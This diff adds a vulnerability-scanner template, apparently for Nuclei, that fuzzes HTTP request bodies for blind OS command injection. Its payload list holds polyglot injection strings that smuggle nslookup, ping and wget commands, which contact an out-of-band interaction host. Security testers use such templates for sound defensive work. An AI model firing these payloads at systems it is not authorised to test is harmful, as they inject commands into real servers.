@@ -1,0 +1,45 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{payload}}'
+    mode: single
+    part: body
+    type: postfix
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  payloads:
+    payload:
+    - '&nslookup {{marker}}&''\"`0&nslookup {{marker}}&`'''
+    - 1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}";nslookup${IFS}{{marker}};#${IFS}
+    - '/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-''/*$(nslookup
+      {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||''"||nslookup({{marker}})||"/*`*/'
+    - $(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)
+  pre-condition:
+  - dsl:
+    - method == "POST"
+    - method == "PUT"
+    - method == "PATCH"
+    - method == "DELETE"
+    type: dsl
+  stop-at-first-match: true
+id: cmdi-blind-oast-polyglot-body
+info:
+  author: pdteam,geeknik
+  description: 'Potential blind OS command injection vulnerabilities, where the application
+    constructs OS commands using unsanitized user input.
+
+    Successful exploitation could lead to arbitrary command execution on the system.
+
+    '
+  name: Blind OS Command Injection
+  reference:
+  - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+  severity: high
+  tags: fuzzing-req-body,rce,dast,fuzzing-req-rce
+variables:
+  marker: '{{interactsh-url}}'
